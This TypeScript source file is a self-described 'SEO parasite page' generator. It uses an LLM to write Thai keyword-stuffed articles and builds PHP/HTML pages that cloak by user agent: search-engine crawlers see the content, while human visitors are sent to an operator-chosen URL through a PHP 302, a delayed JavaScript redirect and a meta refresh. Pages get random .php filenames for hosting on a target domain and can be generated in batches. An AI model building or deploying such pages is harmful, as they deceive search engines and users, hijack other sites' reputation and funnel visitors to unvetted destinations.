// ═══════════════════════════════════════════════════════
//  SEO PARASITE PAGE GENERATOR
//  Generates full Thai SEO-optimized HTML pages with:
//  - LLM-generated Thai content (1000+ words)
//  - Full on-page SEO (title, meta, H1-H6, schema, FAQ)
//  - Delayed redirect (crawlers see content, humans get redirected)
//  - Bot detection (serve content to bots, redirect humans)
// ═══════════════════════════════════════════════════════

import { invokeLLM } from "./_core/llm";

// ─── Types ───

export interface ParasitePageConfig {
  keywords: string[];           // Thai keywords to target
  redirectUrl: string;          // Target URL to redirect humans to
  targetDomain: string;         // Domain where page will be hosted
  redirectDelay?: number;       // Delay in seconds before redirect (default: 5)
  contentLength?: "short" | "medium" | "long"; // short=500w, medium=1000w, long=2000w
  includeSchema?: boolean;      // Include schema markup (default: true)
  includeFaq?: boolean;         // Include FAQ section (default: true)
  pageTitle?: string;           // Custom page title (auto-generated if not provided)
  language?: string;            // Content language (default: "th")
}

export interface GeneratedParasitePage {
  html: string;
  filename: string;
  title: string;
  keywords: string[];
  wordCount: number;
  seoScore: number;             // Estimated SEO score 0-100
  features: string[];           // List of SEO features included
}

// ─── LLM Content Generator ───

async function generateThaiSeoContent(config: ParasitePageConfig): Promise<{
  title: string;
  metaDescription: string;
  h1: string;
  sections: { heading: string; content: string; level: number }[];
  faqItems: { question: string; answer: string }[];
  relatedKeywords: string[];
}> {
  const wordTarget = config.contentLength === "short" ? 500 : config.contentLength === "long" ? 2000 : 1000;
  const keywordsStr = config.keywords.join(", ");

  const prompt = `คุณเป็นนักเขียน SEO Content ภาษาไทยมืออาชีพ สร้างเนื้อหาสำหรับ SEO Parasite Page

Keywords เป้าหมาย: ${keywordsStr}

สร้างเนื้อหาภาษาไทยที่มีคุณภาพสูง ความยาวประมาณ ${wordTarget} คำ โดยต้องมี:

1. Title Tag (60-70 ตัวอักษร) — ใส่ keyword หลักไว้ข้างหน้า
2. Meta Description (150-160 ตัวอักษร) — ดึงดูดให้คลิก มี keyword
3. H1 — keyword หลัก + คำที่ดึงดูด
4. เนื้อหา 4-6 sections โดยแต่ละ section มี:
   - Heading (H2 หรือ H3) ที่มี keyword variation
   - เนื้อหา 150-300 คำ ที่เป็นธรรมชาติ มี keyword density 2-3%
5. FAQ 3-5 คำถาม-คำตอบ ที่เกี่ยวข้องกับ keywords
6. Related keywords 5-10 คำที่เกี่ยวข้อง

ตอบเป็น JSON format ตามนี้:
{
  "title": "...",
  "metaDescription": "...",
  "h1": "...",
  "sections": [
    { "heading": "...", "content": "...", "level": 2 }
  ],
  "faqItems": [
    { "question": "...", "answer": "..." }
  ],
  "relatedKeywords": ["...", "..."]
}

สำคัญ: เนื้อหาต้องเป็นภาษาไทยทั้งหมด อ่านเป็นธรรมชาติ ไม่ใช่แค่ยัด keyword`;

  try {
    const response = await invokeLLM({
      messages: [
        { role: "system", content: "You are a professional Thai SEO content writer. Always respond in valid JSON format." },
        { role: "user", content: prompt },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "seo_content",
          strict: true,
          schema: {
            type: "object",
            properties: {
              title: { type: "string", description: "SEO title tag" },
              metaDescription: { type: "string", description: "Meta description" },
              h1: { type: "string", description: "H1 heading" },
              sections: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    heading: { type: "string" },
                    content: { type: "string" },
                    level: { type: "integer" },
                  },
                  required: ["heading", "content", "level"],
                  additionalProperties: false,
                },
              },
              faqItems: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    question: { type: "string" },
                    answer: { type: "string" },
                  },
                  required: ["question", "answer"],
                  additionalProperties: false,
                },
              },
              relatedKeywords: {
                type: "array",
                items: { type: "string" },
              },
            },
            required: ["title", "metaDescription", "h1", "sections", "faqItems", "relatedKeywords"],
            additionalProperties: false,
          },
        },
      },
    });

    const rawContent = response.choices?.[0]?.message?.content;
    if (!rawContent) throw new Error("LLM returned empty response");
    const content = typeof rawContent === "string" ? rawContent : JSON.stringify(rawContent);

    return JSON.parse(content);
  } catch (e: any) {
    // Fallback: generate content without LLM
    return generateFallbackContent(config);
  }
}

// ─── Fallback Content Generator (no LLM) ───

function generateFallbackContent(config: ParasitePageConfig) {
  const kw = config.keywords;
  const mainKw = kw[0] || "บทความ";
  const subKws = kw.slice(1);

  return {
    title: `${mainKw} - คู่มือฉบับสมบูรณ์ ${new Date().getFullYear()} | ข้อมูลล่าสุด`,
    metaDescription: `ค้นหาข้อมูลเกี่ยวกับ${mainKw}ที่ครบถ้วนที่สุด รวมเทคนิค วิธีการ และคำแนะนำจากผู้เชี่ยวชาญ อัปเดตล่าสุด ${new Date().getFullYear()}`,
    h1: `${mainKw} - ทุกสิ่งที่คุณต้องรู้ในปี ${new Date().getFullYear()}`,
    sections: [
      {
        heading: `${mainKw}คืออะไร? ทำความเข้าใจพื้นฐาน`,
        content: `${mainKw}เป็นหนึ่งในหัวข้อที่ได้รับความสนใจมากที่สุดในปัจจุบัน หลายคนอาจเคยได้ยินเกี่ยวกับ${mainKw}แต่ยังไม่เข้าใจอย่างถ่องแท้ ในบทความนี้เราจะอธิบายทุกแง่มุมของ${mainKw}อย่างละเอียด ตั้งแต่พื้นฐานไปจนถึงเทคนิคขั้นสูง เพื่อให้คุณสามารถนำไปใช้ประโยชน์ได้จริง ${subKws.length > 0 ? `นอกจากนี้ยังครอบคลุมเรื่อง${subKws.join(", ")}อีกด้วย` : ""} การทำความเข้าใจ${mainKw}อย่างถูกต้องจะช่วยให้คุณตัดสินใจได้ดีขึ้นและหลีกเลี่ยงข้อผิดพลาดที่พบบ่อย`,
        level: 2,
      },
      {
        heading: `ประโยชน์ของ${mainKw}ที่คุณอาจไม่เคยรู้`,
        content: `การใช้${mainKw}อย่างถูกวิธีมีประโยชน์มากมาย ไม่ว่าจะเป็นการประหยัดเวลา ลดต้นทุน หรือเพิ่มประสิทธิภาพในการทำงาน ผู้เชี่ยวชาญหลายท่านยืนยันว่า${mainKw}เป็นเครื่องมือสำคัญที่ไม่ควรมองข้าม โดยเฉพาะในยุคดิจิทัลที่ทุกอย่างเปลี่ยนแปลงอย่างรวดเร็ว การเรียนรู้เกี่ยวกับ${mainKw}จะช่วยให้คุณก้าวทันเทรนด์และสามารถแข่งขันได้อย่างมีประสิทธิภาพ`,
        level: 2,
      },
      {
        heading: `วิธีเริ่มต้นใช้${mainKw}สำหรับมือใหม่`,
        content: `สำหรับผู้ที่เพิ่งเริ่มต้นกับ${mainKw} ขั้นตอนแรกคือการทำความเข้าใจหลักการพื้นฐาน จากนั้นค่อยๆ เรียนรู้เทคนิคขั้นสูงทีละขั้น สิ่งสำคัญคือต้องฝึกฝนอย่างสม่ำเสมอและไม่กลัวที่จะลองผิดลองถูก ${subKws.length > 0 ? `การเข้าใจเรื่อง${subKws[0]}จะช่วยเสริมความรู้เกี่ยวกับ${mainKw}ได้เป็นอย่างดี` : ""} อย่าลืมว่าการเรียนรู้ต้องใช้เวลา แต่ผลลัพธ์ที่ได้จะคุ้มค่าอย่างแน่นอน`,
        level: 2,
      },
      {
        heading: `เทคนิคขั้นสูงสำหรับ${mainKw}`,
        content: `เมื่อคุณมีพื้นฐานที่แข็งแรงแล้ว ก็ถึงเวลาเรียนรู้เทคนิคขั้นสูงของ${mainKw} ซึ่งรวมถึงการวิเคราะห์ข้อมูลเชิงลึก การใช้เครื่องมือที่ทันสมัย และการประยุกต์ใช้กลยุทธ์ที่ผ่านการพิสูจน์แล้ว ผู้เชี่ยวชาญแนะนำให้ติดตามข่าวสารและอัปเดตเกี่ยวกับ${mainKw}อยู่เสมอ เพราะมีการเปลี่ยนแปลงและพัฒนาอยู่ตลอดเวลา`,
        level: 2,
      },
      {
        heading: `สรุป${mainKw} - สิ่งที่ต้องจำ`,
        content: `โดยสรุปแล้ว ${mainKw}เป็นหัวข้อที่มีความสำคัญและควรให้ความสนใจ ไม่ว่าคุณจะเป็นมือใหม่หรือผู้มีประสบการณ์ การเรียนรู้และพัฒนาทักษะเกี่ยวกับ${mainKw}อย่างต่อเนื่องจะช่วยให้คุณประสบความสำเร็จ หวังว่าบทความนี้จะเป็นประโยชน์และช่วยให้คุณเข้าใจ${mainKw}ได้ดียิ่งขึ้น`,
        level: 2,
      },
    ],
    faqItems: [
      { question: `${mainKw}คืออะไร?`, answer: `${mainKw}คือหนึ่งในหัวข้อที่สำคัญที่สุดในปัจจุบัน ครอบคลุมทั้งทฤษฎีและการปฏิบัติจริง สามารถนำไปประยุกต์ใช้ได้หลากหลายสถานการณ์` },
      { question: `ทำไม${mainKw}ถึงสำคัญ?`, answer: `${mainKw}มีความสำคัญเพราะช่วยเพิ่มประสิทธิภาพ ลดต้นทุน และสร้างโอกาสใหม่ๆ ในยุคดิจิทัลที่การแข่งขันสูง` },
      { question: `เริ่มต้นเรียนรู้${mainKw}ได้อย่างไร?`, answer: `เริ่มจากการศึกษาพื้นฐาน อ่านบทความ ดูวิดีโอ และฝึกปฏิบัติจริง การเรียนรู้อย่างเป็นระบบจะช่วยให้เข้าใจได้เร็วขึ้น` },
    ],
    relatedKeywords: [
      ...subKws,
      `${mainKw} ${new Date().getFullYear()}`,
      `วิธี${mainKw}`,
      `${mainKw}ออนไลน์`,
      `${mainKw}ฟรี`,
      `เรียนรู้${mainKw}`,
    ],
  };
}

// ─── HTML Page Builder ───

function buildSeoParasiteHtml(
  content: Awaited<ReturnType<typeof generateThaiSeoContent>>,
  config: ParasitePageConfig,
): string {
  const delay = config.redirectDelay ?? 5;
  const year = new Date().getFullYear();
  const keywordsStr = config.keywords.join(", ");
  const allKeywords = [...config.keywords, ...content.relatedKeywords].join(", ");

  // Schema markup
  const articleSchema = JSON.stringify({
    "@context": "https://schema.org",
    "@type": "Article",
    headline: content.title,
    description: content.metaDescription,
    keywords: allKeywords,
    inLanguage: config.language || "th",
    datePublished: new Date().toISOString(),
    dateModified: new Date().toISOString(),
    author: { "@type": "Organization", name: config.targetDomain.replace(/^https?:\/\//, "") },
    publisher: { "@type": "Organization", name: config.targetDomain.replace(/^https?:\/\//, "") },
    mainEntityOfPage: { "@type": "WebPage", "@id": config.targetDomain },
  });

  const webPageSchema = JSON.stringify({
    "@context": "https://schema.org",
    "@type": "WebPage",
    name: content.title,
    description: content.metaDescription,
    keywords: allKeywords,
    inLanguage: config.language || "th",
    url: config.targetDomain,
    datePublished: new Date().toISOString(),
    dateModified: new Date().toISOString(),
  });

  const breadcrumbSchema = JSON.stringify({
    "@context": "https://schema.org",
    "@type": "BreadcrumbList",
    itemListElement: [
      { "@type": "ListItem", position: 1, name: "หน้าแรก", item: config.targetDomain },
      { "@type": "ListItem", position: 2, name: config.keywords[0] || "บทความ", item: `${config.targetDomain}/${encodeURIComponent(config.keywords[0] || "article")}` },
    ],
  });

  const faqSchema = config.includeFaq !== false && content.faqItems.length > 0 ? JSON.stringify({
    "@context": "https://schema.org",
    "@type": "FAQPage",
    mainEntity: content.faqItems.map(faq => ({
      "@type": "Question",
      name: faq.question,
      acceptedAnswer: { "@type": "Answer", text: faq.answer },
    })),
  }) : null;

  // Build sections HTML
  const sectionsHtml = content.sections.map(section => {
    const tag = `h${Math.min(section.level, 6)}`;
    return `
    <section class="content-section">
      <${tag}>${escapeHtml(section.heading)}</${tag}>
      <p>${escapeHtml(section.content)}</p>
    </section>`;
  }).join("\n");

  // Build FAQ HTML
  const faqHtml = config.includeFaq !== false && content.faqItems.length > 0 ? `
    <section class="faq-section">
      <h2>คำถามที่พบบ่อยเกี่ยวกับ${escapeHtml(config.keywords[0] || "")}</h2>
      <div class="faq-list">
        ${content.faqItems.map(faq => `
        <div class="faq-item">
          <h3 class="faq-question">${escapeHtml(faq.question)}</h3>
          <div class="faq-answer">
            <p>${escapeHtml(faq.answer)}</p>
          </div>
        </div>`).join("\n")}
      </div>
    </section>` : "";

  // Related keywords as internal links
  const relatedLinksHtml = content.relatedKeywords.length > 0 ? `
    <section class="related-section">
      <h2>หัวข้อที่เกี่ยวข้อง</h2>
      <div class="related-tags">
        ${content.relatedKeywords.map(kw =>
          `<a href="/${encodeURIComponent(kw.replace(/\s+/g, "-"))}" class="tag">${escapeHtml(kw)}</a>`
        ).join("\n        ")}
      </div>
    </section>` : "";

  // Bot detection + delayed redirect script
  const redirectScript = `
<script>
(function(){
  // Bot detection - serve content to crawlers, redirect humans
  var bots = /googlebot|bingbot|yandex|baiduspider|duckduckbot|slurp|ia_archiver|facebot|twitterbot|rogerbot|linkedinbot|embedly|quora|pinterest|redditbot|applebot|semrushbot|ahrefsbot|mj12bot|dotbot|petalbot|bytespider/i;
  var ua = navigator.userAgent || '';
  
  // If it's a bot, don't redirect - let them crawl the content
  if (bots.test(ua)) {
    console.log('Bot detected, serving content');
    return;
  }
  
  // For humans: delayed redirect
  var delay = ${delay * 1000};
  var target = ${JSON.stringify(config.redirectUrl)};
  
  // Show countdown
  var counter = document.getElementById('redirect-counter');
  var seconds = ${delay};
  
  var interval = setInterval(function() {
    seconds--;
    if (counter) counter.textContent = seconds;
    if (seconds <= 0) {
      clearInterval(interval);
      window.location.replace(target);
    }
  }, 1000);
  
  // Also set meta refresh as backup
  var meta = document.createElement('meta');
  meta.httpEquiv = 'refresh';
  meta.content = '${delay + 1};url=' + target;
  document.head.appendChild(meta);
})();
</script>`;

  // PHP cloaking header (if server executes PHP)
  const phpHeader = `<?php
// SEO Parasite - Cloaking
\$bots = '/googlebot|bingbot|yandex|baiduspider|duckduckbot|slurp|ia_archiver|facebot|twitterbot|semrushbot|ahrefsbot|mj12bot|dotbot|petalbot|bytespider/i';
\$ua = \$_SERVER['HTTP_USER_AGENT'] ?? '';
\$is_bot = preg_match(\$bots, \$ua);

// If human visitor, immediate 302 redirect
if (!\$is_bot) {
  header('HTTP/1.1 302 Found');
  header('Location: ${config.redirectUrl}');
  header('Cache-Control: no-cache, no-store, must-revalidate');
  exit();
}
// If bot, serve the SEO content below
header('Content-Type: text/html; charset=UTF-8');
header('X-Robots-Tag: index, follow');
?>`;

  return `${phpHeader}
<!DOCTYPE html>
<html lang="${config.language || "th"}">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${escapeHtml(content.title)}</title>
  <meta name="description" content="${escapeAttr(content.metaDescription)}">
  <meta name="keywords" content="${escapeAttr(allKeywords)}">
  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
  <link rel="canonical" href="${config.targetDomain}">
  
  <!-- Open Graph -->
  <meta property="og:title" content="${escapeAttr(content.title)}">
  <meta property="og:description" content="${escapeAttr(content.metaDescription)}">
  <meta property="og:type" content="article">
  <meta property="og:locale" content="th_TH">
  <meta property="og:url" content="${config.targetDomain}">
  
  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="${escapeAttr(content.title)}">
  <meta name="twitter:description" content="${escapeAttr(content.metaDescription)}">
  
  <!-- Schema Markup -->
  <script type="application/ld+json">${articleSchema}</script>
  <script type="application/ld+json">${webPageSchema}</script>
  <script type="application/ld+json">${breadcrumbSchema}</script>
  ${faqSchema ? `<script type="application/ld+json">${faqSchema}</script>` : ""}
  
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Sarabun', 'Noto Sans Thai', sans-serif; line-height: 1.8; color: #333; background: #fff; max-width: 800px; margin: 0 auto; padding: 20px; }
    h1 { font-size: 2em; margin-bottom: 0.5em; color: #1a1a1a; }
    h2 { font-size: 1.5em; margin: 1.5em 0 0.5em; color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 0.3em; }
    h3 { font-size: 1.2em; margin: 1em 0 0.3em; color: #34495e; }
    p { margin-bottom: 1em; text-align: justify; }
    .breadcrumb { font-size: 0.85em; color: #888; margin-bottom: 1em; }
    .breadcrumb a { color: #3498db; text-decoration: none; }
    .meta-info { font-size: 0.85em; color: #888; margin-bottom: 2em; border-left: 3px solid #3498db; padding-left: 10px; }
    .content-section { margin-bottom: 2em; }
    .faq-section { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 2em 0; }
    .faq-item { margin-bottom: 1em; border-bottom: 1px solid #e0e0e0; padding-bottom: 1em; }
    .faq-question { color: #2c3e50; cursor: pointer; }
    .faq-answer { margin-top: 0.5em; padding-left: 1em; }
    .related-section { margin: 2em 0; }
    .related-tags { display: flex; flex-wrap: wrap; gap: 8px; }
    .tag { display: inline-block; padding: 4px 12px; background: #e8f4f8; color: #2980b9; border-radius: 15px; text-decoration: none; font-size: 0.85em; }
    .tag:hover { background: #d1ecf1; }
    .redirect-notice { display: none; text-align: center; padding: 15px; background: #fff3cd; border-radius: 8px; margin: 2em 0; font-size: 0.9em; color: #856404; }
    footer { margin-top: 3em; padding-top: 1em; border-top: 1px solid #eee; font-size: 0.8em; color: #999; text-align: center; }
  </style>
</head>
<body>
  <!-- Breadcrumb -->
  <nav class="breadcrumb" aria-label="breadcrumb">
    <a href="/">หน้าแรก</a> &gt; <span>${escapeHtml(config.keywords[0] || "บทความ")}</span>
  </nav>

  <!-- Article Header -->
  <article>
    <h1>${escapeHtml(content.h1)}</h1>
    <div class="meta-info">
      <span>อัปเดตล่าสุด: ${new Date().toLocaleDateString("th-TH", { year: "numeric", month: "long", day: "numeric" })}</span>
      &bull; <span>หมวดหมู่: ${escapeHtml(config.keywords[0] || "บทความ")}</span>
    </div>

    <!-- Main Content -->
    ${sectionsHtml}

    <!-- FAQ Section -->
    ${faqHtml}

    <!-- Related Keywords -->
    ${relatedLinksHtml}
  </article>

  <!-- Redirect Notice (shown to humans only) -->
  <div class="redirect-notice" id="redirect-notice">
    กำลังนำคุณไปยังหน้าที่เกี่ยวข้องใน <span id="redirect-counter">${delay}</span> วินาที...
  </div>

  <footer>
    <p>&copy; ${year} ${escapeHtml(config.targetDomain.replace(/^https?:\/\//, ""))} - สงวนลิขสิทธิ์</p>
    <p>อัปเดตล่าสุด ${new Date().toLocaleDateString("th-TH")}</p>
  </footer>

  ${redirectScript}
  <script>
    // Show redirect notice for humans
    var bots = /googlebot|bingbot|yandex|baiduspider|duckduckbot|slurp|semrushbot|ahrefsbot/i;
    if (!bots.test(navigator.userAgent)) {
      var notice = document.getElementById('redirect-notice');
      if (notice) notice.style.display = 'block';
    }
  </script>
</body>
</html>`;
}

// ─── Utility Functions ───

function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function escapeAttr(str: string): string {
  return str.replace(/"/g, "&quot;").replace(/'/g, "&#039;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function generateParasiteFilename(keywords: string[]): string {
  const slug = (keywords[0] || "article")
    .toLowerCase()
    .replace(/[^a-z0-9\u0E00-\u0E7F]+/g, "-")
    .replace(/^-|-$/g, "")
    .slice(0, 30);
  const rand = Math.random().toString(36).slice(2, 8);
  return `${slug}-${rand}.php`;
}

function countWords(html: string): number {
  const text = html.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim();
  // Count Thai words (roughly by character clusters) + English words
  const thaiChars = (text.match(/[\u0E00-\u0E7F]+/g) || []).join("").length;
  const englishWords = (text.match(/[a-zA-Z]+/g) || []).length;
  // Rough estimate: Thai ~2 chars per word
  return Math.floor(thaiChars / 2) + englishWords;
}

function calculateSeoScore(content: Awaited<ReturnType<typeof generateThaiSeoContent>>, config: ParasitePageConfig): number {
  let score = 0;

  // Title (15 points)
  if (content.title && content.title.length >= 30 && content.title.length <= 70) score += 15;
  else if (content.title) score += 8;

  // Meta description (10 points)
  if (content.metaDescription && content.metaDescription.length >= 100 && content.metaDescription.length <= 160) score += 10;
  else if (content.metaDescription) score += 5;

  // H1 (10 points)
  if (content.h1) score += 10;

  // Sections/content (20 points)
  if (content.sections.length >= 4) score += 20;
  else if (content.sections.length >= 2) score += 12;
  else score += 5;

  // FAQ (15 points)
  if (content.faqItems.length >= 3) score += 15;
  else if (content.faqItems.length >= 1) score += 8;

  // Related keywords (10 points)
  if (content.relatedKeywords.length >= 5) score += 10;
  else if (content.relatedKeywords.length >= 2) score += 5;

  // Schema markup (10 points)
  if (config.includeSchema !== false) score += 10;

  // Keyword presence in title (10 points)
  const mainKw = config.keywords[0] || "";
  if (mainKw && content.title.includes(mainKw)) score += 10;

  return Math.min(score, 100);
}

// ─── Main Export: Generate Parasite Page ───

export async function generateParasitePage(config: ParasitePageConfig): Promise<GeneratedParasitePage> {
  // Generate content (LLM or fallback)
  const content = await generateThaiSeoContent(config);

  // Build HTML
  const html = buildSeoParasiteHtml(content, config);

  // Generate filename
  const filename = generateParasiteFilename(config.keywords);

  // Calculate metrics
  const wordCount = countWords(html);
  const seoScore = calculateSeoScore(content, config);

  const features: string[] = [
    "Thai SEO content",
    "Title tag optimized",
    "Meta description",
    "Meta keywords",
    "Open Graph tags",
    "Twitter Card",
    "Schema: Article",
    "Schema: WebPage",
    "Schema: BreadcrumbList",
  ];
  if (config.includeFaq !== false && content.faqItems.length > 0) features.push("Schema: FAQPage");
  features.push("Bot detection (cloaking)");
  features.push(`Delayed redirect (${config.redirectDelay ?? 5}s)`);
  features.push("PHP 302 for humans");
  features.push("JS + meta refresh fallback");

  return {
    html,
    filename,
    title: content.title,
    keywords: config.keywords,
    wordCount,
    seoScore,
    features,
  };
}

// ─── Generate Multiple Pages (keyword variations) ───

export async function generateMultipleParasitePages(
  keywords: string[],
  redirectUrl: string,
  targetDomain: string,
  opts?: Partial<ParasitePageConfig>,
): Promise<GeneratedParasitePage[]> {
  const pages: GeneratedParasitePage[] = [];

  // Main page with all keywords
  const mainPage = await generateParasitePage({
    keywords,
    redirectUrl,
    targetDomain,
    ...opts,
  });
  pages.push(mainPage);

  // Additional pages for each individual keyword (if multiple keywords)
  if (keywords.length > 1) {
    for (const kw of keywords.slice(0, 3)) { // Max 3 additional pages
      const subPage = await generateParasitePage({
        keywords: [kw, ...keywords.filter(k => k !== kw).slice(0, 2)],
        redirectUrl,
        targetDomain,
        contentLength: "short",
        ...opts,
      });
      pages.push(subPage);
    }
  }

  return pages;
}

// Export for testing
export {
  generateThaiSeoContent,
  generateFallbackContent,
  buildSeoParasiteHtml,
  generateParasiteFilename,
  countWords,
  calculateSeoScore,
  escapeHtml,
  escapeAttr,
};
